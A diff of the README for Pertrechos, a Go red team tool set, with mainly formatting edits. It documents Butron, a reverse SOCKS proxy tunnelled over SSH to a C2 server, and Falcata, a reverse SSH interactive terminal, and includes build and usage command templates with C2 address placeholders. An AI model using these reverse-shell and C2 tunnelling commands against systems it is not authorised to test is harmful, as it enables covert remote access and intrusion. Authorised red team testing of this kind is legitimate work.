@@ -1,22 +1,28 @@
 Pertrechos
 ===========================
 
-*petrechos: Red Team Tool Set*
+*pertrechos: Red Team Tool Set*
 
+.. image::  https://github.com/rebujacker/SiestaTime/blob/master/src/client/electronGUI/static/icons/png/STicon.png
+    :height: 64px
+    :width: 64px
+    :alt: STime logo
 
 +----------------+--------------------------------------------------+
-|Project site    |https://github.com/rebujacker/Pertrechos           |
+|Project site    | https://github.com/rebujacker/Pertrechos          |
 +----------------+--------------------------------------------------+
-|Issues          |https://github.com/rebujacker/Pertrechos/issues/   |
+|Issues          | https://github.com/rebujacker/Pertrechos/issues/  |
 +----------------+--------------------------------------------------+
-|Author          |Alvaro Folgado (rebujacker)                        |
+|Author          | Alvaro Folgado (rebujacker)                       |
 +----------------+--------------------------------------------------+
 |Documentation   |https://github.com/rebujacker/Pertrechos/README.rst|
 +----------------+--------------------------------------------------+
-|Last Version    |Beta                                               |
+|Last Version    | Beta                                              |
 +----------------+--------------------------------------------------+
-|Golang versions |1.10.3 or above                                    |
+|Golang versions | 1.10.3 or above                                   |
 +----------------+--------------------------------------------------+
+
+
 
 What is Pertrechos? What is its Purpose?
 ===================================================
@@ -41,16 +47,18 @@ If you want to test the functionality, use a browser (EG. Mozilla) and set a SOC
 
 Compile and Use:
 
-petrechos.sh butron <windows/darwin/linux> <amd64/386>
-./butron <key.pem> <SSHuser> <C2IP:Port> <IPtoListen:Port> <OptionalParamLog>
+.. code-block:: bash
+
+    petrechos.sh butron <windows/darwin/linux> <amd64/386>
+    ./butron <key.pem> <SSHuser> <C2IP:Port> <IPtoListen:Port> <OptionalParamLog>
 
 Rememeber that your C2 sshd needs to have "GatewayPorts yes" in /etc/ssh/sshd.conf to be able to listen to 0.0.0.0
 
 
 Sources Used:
-https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/
-https://github.com/armon/go-socks5
-https://gist.github.com/codref/473351a24a3ef90162cf10857fac0ff3
+    - https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/
+    - https://github.com/armon/go-socks5
+    - https://gist.github.com/codref/473351a24a3ef90162cf10857fac0ff3
 
 Falcata - Reverse SSH Full Interactive Terminal (Linux,Darwin, TBD Windows)
 ===========================================================================================
@@ -62,14 +70,19 @@ The "Connect" will take care of terminal channels/etc... to have a full interact
 
 Compile and Use:
 
-petrechos.sh falcata <windows/darwin/linux> <amd64/386>
-./falcata egress <key.pem> <SSHuser> <C2IP:Port> <IPtoListen:Port>
-./falcata connect <IPtoListen:Port>
+.. code-block:: bash
+
+    petrechos.sh falcata <windows/darwin/linux> <amd64/386>
+    ./falcata egress <key.pem> <SSHuser> <C2IP:Port> <IPtoListen:Port>
+    ./falcata connect <IPtoListen:Port>
+
 
 Sources Used:
-https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
-https://dev.to/napicella/linux-terminals-tty-pty-and-shell-part-2-2cb2
-https://gist.github.com/napicella/777e83c0ef5b77bf72c0a5d5da9a4b4e
+    - https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+    - https://dev.to/napicella/linux-terminals-tty-pty-and-shell-part-2-2cb2
+    - https://gist.github.com/napicella/777e83c0ef5b77bf72c0a5d5da9a4b4e
+
+
 
 Contributing
 =============================
